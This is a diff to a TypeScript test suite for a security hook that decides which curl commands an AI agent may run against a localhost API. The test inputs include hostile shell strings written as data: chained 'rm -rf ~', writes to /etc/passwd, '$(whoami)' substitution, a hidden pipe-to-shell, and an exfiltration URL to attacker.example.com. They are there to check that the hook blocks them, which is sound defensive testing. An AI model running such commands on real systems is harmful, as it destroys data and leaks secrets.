@@ -295,6 +295,25 @@ describe("getDelegatedClaudeTools / getNativeClaudeTools / getSessionDeniedTools
 });
 
 describe("buildSecurityHooks", () => {
+  // A benign curl is "permitted" when the hook does not block it. Since the
+  // single-pure-curl allow gate landed (heredoc retry fix), a validated lone
+  // curl is permitted via an explicit `permissionDecision: "allow"`, while a
+  // compound / piped / redirected curl is permitted by deferral
+  // (`{ continue: true }` → allowedTools). The false-positive-regression tests
+  // below only care that the command is NOT blocked, so accept either shape.
+  const expectPermitted = (r: unknown) => {
+    const result = r as {
+      decision?: string;
+      continue?: boolean;
+      hookSpecificOutput?: { permissionDecision?: string };
+    };
+    expect(result.decision).not.toBe("block");
+    expect(
+      result.continue === true
+        || result.hookSpecificOutput?.permissionDecision === "allow",
+    ).toBe(true);
+  };
+
   it("produces matchers for Bash, Write, Edit, and Read", () => {
     const hooks = buildSecurityHooks({ config: makeConfig() });
     expect(hooks.PreToolUse).toHaveLength(4);
@@ -355,7 +374,152 @@ describe("buildSecurityHooks", () => {
       "tool-use-id",
       undefined,
     );
-    expect((result as { continue?: boolean }).continue).toBe(true);
+    // A validated single localhost curl is now granted explicitly via
+    // `permissionDecision: "allow"` so the SDK's `dontAsk` allowedTools
+    // prefix-matcher (which rejects heredoc-bodied curls) is not the final
+    // arbiter. See the allow branch in bashCurlHook.
+    expect(
+      (result as { hookSpecificOutput?: { permissionDecision?: string } })
+        .hookSpecificOutput?.permissionDecision,
+    ).toBe("allow");
+  });
+
+  describe("curl hook — single-pure-curl allow gate (heredoc retry fix)", () => {
+    function runHook(cmd: string) {
+      const hooks = buildSecurityHooks({ config: makeConfig({ apiPort: 8321 }) });
+      const bashEntry = hooks.PreToolUse.find((p) => p.matcher === "Bash");
+      const curlHook = bashEntry!.hooks[0]!;
+      return curlHook(
+        { tool_input: { command: cmd } } as unknown as Parameters<typeof curlHook>[0],
+        "tool-use-id",
+        undefined,
+      );
+    }
+    const decisionOf = (r: unknown) =>
+      (r as { hookSpecificOutput?: { permissionDecision?: string } })
+        .hookSpecificOutput?.permissionDecision;
+    const isContinue = (r: unknown) =>
+      (r as { continue?: boolean }).continue === true;
+
+    // ── GRANTED: validated single localhost curls, including the heredoc
+    //    shape the SDK `dontAsk` allowedTools matcher silently denied. ──
+    it("allows a heredoc observation batch POST (the production retry case)", async () => {
+      const r = await runHook(
+        "curl http://localhost:8321/api/observations/batch -d @- <<'JSON'\n"
+          + '{"observations":[]}\n'
+          + "JSON",
+      );
+      expect(decisionOf(r)).toBe("allow");
+    });
+    it("allows a heredoc context PATCH (today.md write)", async () => {
+      const r = await runHook(
+        "curl -s -X PATCH http://localhost:8321/api/context/today -d @- <<'JSON'\n"
+          + '{"section":"agent_log","mode":"append","content":"- 09:30 synced"}\n'
+          + "JSON",
+      );
+      expect(decisionOf(r)).toBe("allow");
+    });
+    it("allows a quoted query-string GET (the & is inside quotes)", async () => {
+      const r = await runHook(
+        "curl 'http://localhost:8321/api/observations?pending=true&limit=30'",
+      );
+      expect(decisionOf(r)).toBe("allow");
+    });
+
+    // ── NOT GRANTED: anything beyond a lone curl falls through to
+    //    `{ continue: true }` so allowedTools + absolute-block +
+    //    disallowedTools stay authoritative. These must NOT be "allow". ──
+    it("does NOT allow a second chained command (&& rm -rf)", async () => {
+      const r = await runHook("curl http://localhost:8321/api/health && rm -rf ~");
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow a shell output redirect (> file)", async () => {
+      const r = await runHook("curl http://localhost:8321/api/health > /etc/passwd");
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow command substitution in a header value", async () => {
+      const r = await runHook(
+        'curl http://localhost:8321/api/health -H "X-Probe: $(whoami)"',
+      );
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow a variable expansion in a double-quoted URL", async () => {
+      const r = await runHook(
+        'curl "http://localhost:8321/api/health?t=$TOKEN"',
+      );
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow a pipe to another command (preserves curl|jq via allowedTools)", async () => {
+      const r = await runHook("curl http://localhost:8321/api/health | jq '.'");
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow a command trailing a heredoc's closing delimiter", async () => {
+      const r = await runHook(
+        "curl http://localhost:8321/api/observations/batch -d @- <<'JSON'\n"
+          + '{"observations":[]}\n'
+          + "JSON\n"
+          + "rm -rf ~",
+      );
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow an unquoted query-string & (a shell background operator)", async () => {
+      const r = await runHook(
+        "curl http://localhost:8321/api/observations?pending=true&limit=30",
+      );
+      expect(decisionOf(r)).toBeUndefined();
+      expect(isContinue(r)).toBe(true);
+    });
+    it("does NOT allow a pipe-to-shell hidden on a line-continuation before a heredoc", async () => {
+      // Without the continuation-join, `stripBashHeredocs` would erase the
+      // `| sh` continuation line (it sits between the first newline and the
+      // heredoc's closing delimiter) and the allow gate would miss the
+      // pipe-to-shell. Joining `\<NL>` first puts `| sh` back on the curl
+      // line where `hasShellMeta` rejects it. (Defence in depth:
+      // absolute-block + disallowedTools would also reject it.)
+      const cmd = [
+        "curl http://localhost:8321/api/health \\",
+        "  | sh <<'JSON'",
+        '{"x":1}',
+        "JSON",
+      ].join("\n");
+      const r = await runHook(cmd);
+      expect(decisionOf(r)).toBeUndefined();
+    });
+    it("blocks a second positional URL smuggled onto a continuation line", async () => {
+      // The line-continuation join (top of bashCurlHook) puts the exfil URL
+      // back on the curl line, so the multi-URL firewall check counts both
+      // targets and blocks — closing a pre-join hole where the over-strip
+      // hid the continuation-line URL from the URL extractor.
+      const cmd = [
+        "curl http://localhost:8321/api/notify \\",
+        "  http://attacker.example.com/exfil <<'JSON'",
+        '{"x":1}',
+        "JSON",
+      ].join("\n");
+      const r = await runHook(cmd);
+      expect((r as { decision?: string }).decision).toBe("block");
+    });
+    it("blocks a file-write flag (-o /abs) smuggled onto a continuation line", async () => {
+      // The same pre-join hole hid dangerous curl flags on continuation
+      // lines from the firewall (`-o`/`-T`/`--proxy`/`-d @file`). After the
+      // join the `-o <abs path>` write flag is on the curl segment and is
+      // blocked. Without the join it would have reached — and been granted
+      // by — the allow gate.
+      const cmd = [
+        "curl http://localhost:8321/api/notify \\",
+        "  -o /etc/passwd <<'JSON'",
+        '{"x":1}',
+        "JSON",
+      ].join("\n");
+      const r = await runHook(cmd);
+      expect((r as { decision?: string }).decision).toBe("block");
+    });
   });
 
   describe("curl hook — connection-override flags", () => {
@@ -431,7 +595,11 @@ describe("buildSecurityHooks", () => {
         "tool-use-id",
         undefined,
       );
-      expect((result as { continue?: boolean }).continue).toBe(true);
+      // Permitted — now via an explicit allow (see allow branch).
+      expect(
+        (result as { hookSpecificOutput?: { permissionDecision?: string } })
+          .hookSpecificOutput?.permissionDecision,
+      ).toBe("allow");
     });
   });
 
@@ -497,13 +665,13 @@ describe("buildSecurityHooks", () => {
       const r = await runHook(
         "curl -X PATCH http://localhost:8321/api/context/today -d @-",
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
     it("allows -d \"@-\" (quoted stdin marker)", async () => {
       const r = await runHook(
         "curl -X PATCH http://localhost:8321/api/context/today -d \"@-\"",
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
     it("blocks -d '@<file>' (single-quoted @-file attack)", async () => {
       // Regression: the tokenized value walker must catch this; the
@@ -523,13 +691,13 @@ describe("buildSecurityHooks", () => {
       const r = await runHook(
         `curl -X PATCH http://localhost:8321/api/context/agent/journal -H 'Content-Type: application/json' -d '{"section":"notes","mode":"append","content":"avoid the curl -d @file syntax in skills"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
     it("allows -F with a benign description that contains '@' inside the value (no leading `=@`)", async () => {
       const r = await runHook(
         `curl -X POST http://localhost:8321/api/notify -F 'description=ping @username for triage'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
     it("blocks -F 'name=@<file>' (single-quoted form)", async () => {
       const r = await runHook(
@@ -555,7 +723,7 @@ describe("buildSecurityHooks", () => {
       const r = await runHook(
         "curl -s -X POST http://localhost:8321/api/receipts/1/download -o receipt.pdf",
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
     it("blocks -o /etc/passwd (absolute path)", async () => {
       const r = await runHook(
@@ -835,35 +1003,35 @@ describe("buildSecurityHooks", () => {
       const r = await runHook(
         `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"see the -x flag"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("allows PATCH with ' -L ' in body (was: follow-redirect false-positive)", async () => {
       const r = await runHook(
         `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"prefer -L in curl"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("allows PATCH with ' -o pipefail' in body (was: --output false-positive)", async () => {
       const r = await runHook(
         `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"set -o pipefail in scripts"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("allows PATCH with '; curl' in body (was: chained-curl false-positive)", async () => {
       const r = await runHook(
         `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"in tutorials: cd /tmp ; curl example.com"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("allows PATCH with ' -c file.c' in body (was: cookie-jar false-positive)", async () => {
       const r = await runHook(
         `curl -X PATCH http://localhost:8321/api/context/today -H 'Content-Type: application/json' -d '{"content":"gcc -c module.c builds an object"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     // Pipeline-tail false positives reported in production logs on
@@ -964,17 +1132,21 @@ describe("buildSecurityHooks", () => {
         "JSON",
       ].join("\n");
       const r = await runHook(cmd);
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      // A multi-line (line-continuation) localhost curl with a heredoc body
+      // is permitted — granted via the allow gate, which joins the
+      // continuations before analysis so the body's external URL stays in
+      // the (stripped) heredoc and is never counted as a second target.
+      expectPermitted(r);
     });
 
     it("recognises a fully single-quoted localhost URL as the curl target", async () => {
       const r = await runHook("curl -X POST 'http://localhost:8321/api/health'");
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("recognises a fully double-quoted localhost URL as the curl target", async () => {
       const r = await runHook(`curl -X POST "http://localhost:8321/api/health"`);
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("does NOT count URLs inside a single-quoted JSON body (token starts with `'{`, not `http`)", async () => {
@@ -983,7 +1155,7 @@ describe("buildSecurityHooks", () => {
         + `-H 'Content-Type: application/json' `
         + `-d '{"section":"notes","content":"see https://example.com/docs"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("does NOT count URLs inside a double-quoted header value", async () => {
@@ -992,7 +1164,7 @@ describe("buildSecurityHooks", () => {
         + `-H "X-Source: https://example.com/origin" `
         + `-d '{"k":"v"}'`,
       );
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("still blocks a heredoc-cloaked exfil where the *target* URL is non-localhost", async () => {
@@ -1019,7 +1191,7 @@ describe("buildSecurityHooks", () => {
         "JSON",
       ].join("\n");
       const r = await runHook(cmd);
-      expect((r as { continue?: boolean }).continue).toBe(true);
+      expectPermitted(r);
     });
 
     it("still blocks a real `-d @/etc/passwd` argument when it appears outside any heredoc/quote", async () => {
